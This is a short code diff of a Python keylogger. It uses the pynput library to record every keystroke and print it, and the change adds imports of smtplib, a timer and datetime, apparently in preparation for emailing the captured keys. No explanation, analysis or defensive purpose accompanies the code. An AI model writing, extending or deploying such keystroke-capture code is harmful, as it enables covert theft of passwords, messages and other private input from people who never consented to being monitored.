@@ -1,4 +1,7 @@
 from pynput.keyboard import Listener
+import smtplib
+from threading import Timer
+from datetime import datetime
 
 def keylogger(keystroke):
     keystroke = str(keystroke)
@@ -10,7 +13,7 @@ def keylogger(keystroke):
     elif keystroke == 'Key.enter':
         keystroke = '\n'
 
-    print(keystroke, sep = ' ')
+    print(keystroke)
 
 with Listener(on_press=keylogger) as l:
     l.join()
